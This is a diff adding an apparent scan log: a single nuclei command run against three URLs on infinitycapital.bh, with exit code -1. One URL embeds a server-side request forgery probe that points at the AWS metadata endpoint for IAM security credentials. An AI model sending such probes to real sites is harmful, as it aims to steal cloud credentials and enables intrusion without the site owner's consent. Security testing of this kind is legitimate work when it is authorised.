@@ -1,0 +1,4 @@
+# command: printf '%s\n' 'https://www.infinitycapital.bh/404?q=test' 'https://www.infinitycapital.bh/contact?cb=1&q=test' 'https://www.infinitycapital.bh/api/send?none=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F' | timeout 300 nuclei -silent -jsonl -no-color -severity critical,high,medium -tags cve,misconfig,exposure,default-login,tech
+# exit_code: -1
+# ---
+
